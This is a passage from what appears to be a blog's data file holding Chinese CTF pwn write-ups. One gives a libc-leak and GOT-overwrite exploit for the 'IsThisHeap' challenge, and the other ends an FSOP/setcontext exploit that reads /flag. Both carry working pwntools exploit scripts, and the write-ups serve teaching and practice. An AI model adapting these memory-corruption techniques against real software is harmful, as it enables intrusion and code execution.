class=\"string\">&#x27;\\0&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>, <span class=\"string\">&#x27;\\0&#x27;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./pwn&#x27;</span>)</span><br><span class=\"line\">context(arch = elf.arch, os = <span class=\"string\">&#x27;linux&#x27;</span>,log_level = <span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class=\"line\">p = remote(<span class=\"string\">&quot;node4.buuoj.cn&quot;</span>,<span class=\"number\">28657</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,data</span>):</span><br><span class=\"line\">    sla(<span class=\"string\">&quot;&gt;&gt; &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">3</span>))</span><br><span class=\"line\">    sla(<span class=\"string\">&quot;Index&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    sea(<span class=\"string\">&quot;Content&quot;</span>,<span class=\"built_in\">str</span>(data))</span><br><span class=\"line\"></span><br><span class=\"line\">edit(-<span class=\"number\">8</span>,p64(<span class=\"number\">0xfbad1800</span>)+p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">libc_leak = uu64(ru(<span class=\"string\">&#x27;\\x7f&#x27;</span>,drop=<span class=\"literal\">False</span>)[-<span class=\"number\">6</span>:])</span><br><span class=\"line\">libc_base = libc_leak - <span class=\"number\">0x1ec980</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class=\"line\">libc.address = libc_base</span><br><span class=\"line\">system_addr = libc.sym.system</span><br><span class=\"line\">bin_sh = libc.search(<span class=\"string\">&#x27;/bin/sh&#x27;</span>).<span class=\"built_in\">next</span>()</span><br><span class=\"line\">magic = libc.sym.setcontext + <span class=\"number\">61</span></span><br><span class=\"line\"></span><br><span class=\"line\">rdx = <span class=\"number\">0x0000000000142c92</span> + libc_base</span><br><span class=\"line\">rdi = <span class=\"number\">0x0000000000023b6a</span> + libc_base</span><br><span class=\"line\">rsi = <span class=\"number\">0x000000000002601f</span> + libc_base</span><br><span class=\"line\"></span><br><span class=\"line\">_IO_wfile_jumps = libc_base + <span class=\"number\">0x1e8f60</span></span><br><span class=\"line\">target = libc_base + <span class=\"number\">0x1ed6a0</span> <span class=\"comment\"># _IO_2_1_stdout_</span></span><br><span class=\"line\">addr = target&amp;(~<span class=\"number\">0xfff</span>)</span><br><span class=\"line\">fuck_frame = SigreturnFrame()</span><br><span class=\"line\">fuck_frame.rdi = <span class=\"number\">0</span></span><br><span class=\"line\">fuck_frame.rsi = addr</span><br><span class=\"line\">fuck_frame.rdx = <span class=\"number\">0x300</span></span><br><span class=\"line\">fuck_frame.rsp = addr</span><br><span class=\"line\">fuck_frame.rip = libc.sym.read</span><br><span class=\"line\">fuck_io = p64(<span class=\"number\">0</span>)*<span class=\"number\">5</span> + p64(<span class=\"number\">1</span>) + p64((((((target+<span class=\"number\">0x100</span>)&gt;&gt;<span class=\"number\">32</span>)-<span class=\"number\">1</span>))&lt;&lt;<span class=\"number\">32</span>)+((target+<span class=\"number\">0x100</span>)&amp;<span class=\"number\">0xffffffff</span>)) + p64(<span class=\"number\">3</span>) + p64(<span class=\"number\">4</span>)</span><br><span class=\"line\"><span class=\"comment\"># p64(1)后的那个地址指向fuck_frame，后面set_context会将这个地址设置为rdx，并以其为基准将fuck_frame的值赋给寄存器</span></span><br><span class=\"line\">fuck_io = fuck_io.ljust(<span class=\"number\">0x88</span>,<span class=\"string\">&#x27;\\0&#x27;</span>)</span><br><span class=\"line\">fuck_io += p64(target+<span class=\"number\">0x30</span>)</span><br><span class=\"line\">fuck_io = fuck_io.ljust(<span class=\"number\">0xa0</span>,<span class=\"string\">&#x27;\\0&#x27;</span>)</span><br><span class=\"line\">fuck_io += p64(target+<span class=\"number\">0x10</span>)   <span class=\"comment\"># wide_data</span></span><br><span class=\"line\">fuck_io = fuck_io.ljust(<span class=\"number\">0xd8</span>,<span class=\"string\">&#x27;\\0&#x27;</span>)</span><br><span class=\"line\">fuck_io += p64(_IO_wfile_jumps + <span class=\"number\">0x10</span>) <span class=\"comment\"># vtable 通过偏移将xsputn改为seekoff</span></span><br><span class=\"line\">fuck_io += p64(<span class=\"number\">0</span>) + p64(magic) + p64(target+<span class=\"number\">0xe8</span>-<span class=\"number\">0x18</span>) + p64(<span class=\"number\">0</span>) <span class=\"comment\"># magic覆盖了wide_data的vtable中的_IO_WOVERFLOW</span></span><br><span class=\"line\">fuck_io += <span class=\"built_in\">str</span>(fuck_frame)</span><br><span class=\"line\"></span><br><span class=\"line\">edit(-<span class=\"number\">8</span>,fuck_io)</span><br><span class=\"line\"></span><br><span class=\"line\">sleep(<span class=\"number\">0.1</span>)</span><br><span class=\"line\">se(p64(rdi)+p64(addr)+p64(rsi)+p64(<span class=\"number\">0x1000</span>)+p64(rdx)+p64(<span class=\"number\">7</span>)+p64(libc.sym.mprotect)+p64(addr+<span class=\"number\">0x40</span>)+asm(<span class=\"string\">&#x27;lea rbp,[rsp+0x200];&#x27;</span>+shellcraft.openat(<span class=\"number\">0</span>,<span class=\"string\">&quot;/flag&quot;</span>,<span class=\"number\">0</span>)+shellcraft.read(<span class=\"string\">&#x27;rax&#x27;</span>,<span class=\"string\">&#x27;rbp&#x27;</span>,<span class=\"number\">0x100</span>)+shellcraft.write(<span class=\"number\">1</span>,<span class=\"string\">&#x27;rbp&#x27;</span>,<span class=\"number\">0x100</span>)+shellcraft.exit(<span class=\"number\">0</span>)))</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>"},{"title":"IsThisHeap","date":"2023-01-02T11:54:26.000Z","_content":"\nNewStarCTF，数组下标越界的堆题，改写got表\n<!-- more -->\n\n查壳，64位开了canary和NX\n\n```sh\n[*] '/home/alphonse/CTF_GAME/new_star/IsThisHeap/pwn'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n```\n\n有个菜单，有add、delete、edit、show、exit五个功能，但实际上delete没有实现。\n\n在add中最多可以同时存在16个chunk，malloc长度固定为0x30，写入内容的时候可以多写一个'\\x00'。\n\n在edit中有下标越界漏洞，没有检查idx是否<0，会从heaps+idx*0x8的位置取出一个指针，并向指针指向的位置写入0x30字节的内容。heaps在0x6020e0，而在0x602080处有一个you_found_me指向自己，可以**修改you_found_me获得一个任意写**，偏移为-12。\n\n在show中依旧没有对下标<0进行检查，仍然有下标越界，会从heaps+idx*0x8的位置取出一个指针，并输出其指向的内容。\n\n也就是说，这题主要是利用edit中下标越界导致的任意写来get shell，这题没开RELRO，说不定可以改个GOT表，有atoi函数，把他改成system，然后输入\"/bin/sh\"就可以get shell了。\n\n在这之前要看看有没有system，没有的话考虑利用show的下标越界来leak libc。\n\n果然没有system，先看看heaps前面有什么。0x602000~0x602068是.got.plt，应该可以通过leak里面的内容来得到libcbase，atoi的位置是0x602058。\n\n直接将you_found_me修改为0x602058，然后show可以得到libcbase，但在这之后程序就走不动了，可能是因为**写入的时候会在最后追加一个\\x00导致__isoc99_scanf错误**。\n\n那不写入8字节，**写入7个字节，反正高位是'\\x00'**，把atoi的.got.plt修改为system的地址，然后在atoi函数处输入\"/bin/sh\\x00\"即可get shell。\n\nexp:\n\n```python\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='pwn2'\nelf=ELF('./'+filename)\nlibc=ELF('libc-2.31.so')\np=process('./'+filename)\n#p=remote('',)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n\ndef edit(idx,content):\n  ru('>> ')\n  sl('3')\n  ru(\"Index:\")\n  sl(str(idx))\n  ru(\"Content:\")\n  s(str(content))\n\ndef show(idx):\n  ru('>> ')\n  sl('4')\n  ru(\"Index:\")\n  sl(str(idx))\n\natoi_got=0x602058\n\n#leak libcbase\npayload=p64(atoi_got)\nedit(-12,payload[:-1])\n\nshow(-12)\noffset=0x445b0\nlibcbase=uu64(ru('\\x7f'))-offset\nleak(\"libcbase\",hex(libcbase))\n\n#get shell\nsys_addr=libcbase+libc.sym['system']\nleak(\"system\",hex(sys_addr))\n\npayload=p64(sys_addr)\ndebug('b *0x400b29')\nedit(-12,payload[:-1])\n\nru('>> ')\nsl('4')\nru(\"Index:\")\ns(\"/bin/sh\\x00\")\n\nitr()\n```\n\n","source":"_posts/IsThisHeap.md","raw":"---\ntitle: IsThisHeap\ndate: 2023-01-02 19:54:26\ncategories: \n- pwn_wp\ntags: \n- pwn\n- index overflow\n- heap\n- got overwrite\n\n---\n\nNewStarCTF，数组下标越界的堆题，改写got表\n<!-- more -->\n\n查壳，64位开了canary和NX\n\n```sh\n[*] '/home/alphonse/CTF_GAME/new_star/IsThisHeap/pwn'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n```\n\n有个菜单，有add、delete、edit、show、exit五个功能，但实际上delete没有实现。\n\n在add中最多可以同时存在16个chunk，malloc长度固定为0x30，写入内容的时候可以多写一个'\\x00'。\n\n在edit中有下标越界漏洞，没有检查idx是否<0，会从heaps+idx*0x8的位置取出一个指针，并向指针指向的位置写入0x30字节的内容。heaps在0x6020e0，而在0x602080处有一个you_found_me指向自己，可以**修改you_found_me获得一个任意写**，偏移为-12。\n\n在show中依旧没有对下标<0进行检查，仍然有下标越界，会从heaps+idx*0x8的位置取出一个指针，并输出其指向的内容。\n\n也就是说，这题主要是利用edit中下标越界导致的任意写来get shell，这题没开RELRO，说不定可以改个GOT表，有atoi函数，把他改成system，然后输入\"/bin/sh\"就可以get shell了。\n\n在这之前要看看有没有system，没有的话考虑利用show的下标越界来leak libc。\n\n果然没有system，先看看heaps前面有什么。0x602000~0x602068是.got.plt，应该可以通过leak里面的内容来得到libcbase，atoi的位置是0x602058。\n\n直接将you_found_me修改为0x602058，然后show可以得到libcbase，但在这之后程序就走不动了，可能是因为**写入的时候会在最后追加一个\\x00导致__isoc99_scanf错误**。\n\n那不写入8字节，**写入7个字节，反正高位是'\\x00'**，把atoi的.got.plt修改为system的地址，然后在atoi函数处输入\"/bin/sh\\x00\"即可get shell。\n\nexp:\n\n```python\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='pwn2'\nelf=ELF('./'+filename)\nlibc=ELF('libc-2.31.so')\np=process('./'+filename)\n#p=remote('',)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n\ndef edit(idx,content):\n  ru('>> ')\n  sl('3')\n  ru(\"Index:\")\n  sl(str(idx))\n  ru(\"Content:\")\n  s(str(content))\n\ndef show(idx):\n  ru('>> ')\n  sl('4')\n  ru(\"Index:\")\n  sl(str(idx))\n\natoi_got=0x602058\n\n#leak libcbase\npayload=p64(atoi_got)\nedit(-12,payload[:-1])\n\nshow(-12)\noffset=0x445b0\nlibcbase=uu64(ru('\\x7f'))-offset\nleak(\"libcbase\",hex(libcbase))\n\n#get shell\nsys_addr=libcbase+libc.sym['system']\nleak(\"system\",hex(sys_addr))\n\npayload=p64(sys_addr)\ndebug('b *0x400b29')\nedit(-12,payload[:-1])\n\nru('>> ')\nsl('4')\nru(\"Index:\")\ns(\"/bin/sh\\x00\")\n\nitr()\n```\n\n","slug":"IsThisHeap","published":1,"updated":"2023-01-02T16:13:36.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czaf7000t5oud8vj58z64","content":"<p>NewStarCTF，数组下标越界的堆题，改写got表</p>\n<span id=\"more\"></span>\n\n<p>查壳，64位开了canary和NX</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[*] <span class=\"string\">&#x27;/home/alphonse/CTF_GAME/new_star/IsThisHeap/pwn&#x27;</span></span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>\n\n<p>有个菜单，有add、delete、edit、show、exit五个功能，但实际上delete没有实现。</p>\n<p>在add中最多可以同时存在16个chunk，malloc长度固定为0x30，写入内容的时候可以多写一个’\\x00’。</p>\n<p>在edit中有下标越界漏洞，没有检查idx是否&lt;0，会从heaps+idx*0x8的位置取出一个指针，并向指针指向的位置写入0x30字节的内容。heaps在0x6020e0，而在0x602080处有一个you_found_me指向自己，可以<strong>修改you_found_me获得一个任意写</strong>，偏移为-12。</p>\n<p>在show中依旧没有对下标&lt;0进行检查，仍然有下标越界，会从heaps+idx*0x8的位置取出一个指针，并输出其指向的内容。</p>\n<p>也就是说，这题主要是利用edit中下标越界导致的任意写来get shell，这题没开RELRO，说不定可以改个GOT表，有atoi函数，把他改成system，然后输入”/bin/sh”就可以get shell了。</p>\n<p>在这之前要看看有没有system，没有的话考虑利用show的下标越界来leak libc。</p>\n<p>果然没有system，先看看heaps前面有什么。0x602000~0x602068是.got.plt，应该可以通过leak里面的内容来得到libcbase，atoi的位置是0x602058。</p>\n<p>直接将you_found_me修改为0x602058，然后show可以得到libcbase，但在这之后程序就走不动了，可能是因为<strong>写入的时候会在最后追加一个\\x00导致__isoc99_scanf错误</strong>。</p>\n<p>那不写入8字节，**写入7个字节，反正高位是’\\x00’**，把atoi的.got.plt修改为system的地址，然后在atoi函数处输入”/bin/sh\\x00”即可get shell。</p>\n<p>exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;pwn2&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class=\"line\">p=process(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\">#p=remote(&#x27;&#x27;,)</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,content</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Index:&quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Content:&quot;</span>)</span><br><span class=\"line\">  s(<span class=\"built_in\">str</span>(content))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Index:&quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\">atoi_got=<span class=\"number\">0x602058</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#leak libcbase</span></span><br><span class=\"line\">payload=p64(atoi_got)</span><br><span class=\"line\">edit(-<span class=\"number\">12</span>,payload[:-<span class=\"number\">1</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">show(-<span class=\"number\">12</span>)</span><br><span class=\"line\">offset=<span class=\"number\">0x445b0</span></span><br><span class=\"line\">libcbase=uu64(ru(<span class=\"string\">&#x27;\\x7f&#x27;</span>))-offset</span><br><span class=\"line\">leak(<span class=\"string\">&quot;libcbase&quot;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#get shell</span></span><br><span class=\"line\">sys_addr=libcbase+libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">leak(<span class=\"string\">&quot;system&quot;</span>,<span class=\"built_in\">hex</span>(sys_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">payload=p64(sys_addr)</span><br><span class=\"line\">debug(<span class=\"string\">&#x27;b *0x400b29&#x27;</span>)</span><br><span class=\"line\">edit(-<span class=\"number\">12</span>,payload[:-<span class=\"number\">1</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">ru(<span class=\"string\">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class=\"line\">sl(<span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\">ru(<span class=\"string\">&quot;Index:&quot;</span>)</span><br><span class=\"line\">s(<span class=\"string\">&quot;/bin/sh\\x00&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"<p>NewStarCTF，数组下标越界的堆题，改写got表</p>","more":"<p>查壳，64位开了canary和NX</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[*] <span class=\"string\">&#x27;/home/alphonse/CTF_GAME/new_star/IsThisHeap/pwn&#x27;</span></span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>\n\n<p>有个菜单，有add、delete、edit、show、exit五个功能，但实际上delete没有实现。</p>\n<p>在add中最多可以同时存在16个chunk，malloc长度固定为0x30，写入内容的时候可以多写一个’\\x00’。</p>\n<p>在edit中有下标越界漏洞，没有检查idx是否&lt;0，会从heaps+idx*0x8的位置取出一个指针，并向指针指向的位置写入0x30字节的内容。heaps在0x6020e0，而在0x602080处有一个you_found_me指向自己，可以<strong>修改you_found_me获得一个任意写</strong>，偏移为-12。</p>\n<p>在show中依旧没有对下标&lt;0进行检查，仍然有下标越界，会从heaps+idx*0x8的位置取出一个指针，并输出其指向的内容。</p>\n<p>也就是说，这题主要是利用edit中下标越界导致的任意写来get shell，这题没开RELRO，说不定可以改个GOT表，有atoi函数，把他改成system，然后输入”/bin/sh”就可以get shell了。</p>\n<p>在这之前要看看有没有system，没有的话考虑利用show的下标越界来leak libc。</p>\n<p>果然没有system，先看看heaps前面有什么。0x602000~0x602068是.got.plt，应该可以通过leak里面的内容来得到libcbase，atoi的位置是0x602058。</p>\n<p>直接将you_found_me修改为0x602058，然后show可以得到libcbase，但在这之后程序就走不动了，可能是因为<strong>写入的时候会在最后追加一个\\x00导致__isoc99_scanf错误</strong>。</p>\n<p>那不写入8字节，**写入7个字节，反正高位是’\\x00’**，把atoi的.got.plt修改为system的地址，然后在atoi函数处输入”/bin/sh\\x00”即可get shell。</p>\n<p>exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;pwn2&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class=\"line\">p=process(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\">#p=remote(&#x27;&#x27;,)</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,content</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Index:&quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Content:&quot;</span>)</span><br><span class=\"line\">  s(<span class=\"built_in\">str</span>(content))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Index:&quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\">atoi_got=<span class=\"number\">0x602058</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#leak libcbase</span></span><br><span class=\"line\">payload=p64(atoi_got)</span><br><span class=\"line\">edit(-<span class=\"number\">12</span>,payload[:-<span class=\"number\">1</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">show(-<span class=\"number\">12</span>)</span><br><span class=\"line\">offset=<span class=\"number\">0x445b0</span></span><br><span class=\"line\">libcbase=uu64(ru(<span 